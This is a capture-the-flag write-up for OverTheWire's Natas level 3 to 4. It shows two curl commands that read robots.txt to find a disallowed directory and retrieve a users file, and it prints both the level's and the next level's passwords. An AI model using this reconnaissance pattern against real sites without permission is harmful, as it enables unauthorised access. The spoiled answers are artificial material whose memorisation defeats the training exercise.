# Natas Level 03 to 04

| Field | Value |
|---|---|
| Platform | OverTheWire |
| Wargame | Natas |
| Level | 3 -> 4 |
| Status | Complete |

## Objective

Use crawler guidance to find a hidden directory.

## Given Access

User: `natas3`

Password:

```text
3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH
```

## Method

The page hint mentions Google. `robots.txt` disallows `/s3cr3t/`, which contains `users.txt`.

## Commands

```bash
curl -s -u natas3:3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH http://natas3.natas.labs.overthewire.org/robots.txt
curl -s -u natas3:3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt
```

## Result

Password for `natas4`:

```text
QryZXc2e0zahULdHrtHxzyYkj59kUxLQ
```

## Lesson

`robots.txt` is a discovery clue, not an access control boundary.

## References

- https://overthewire.org/wargames/natas/
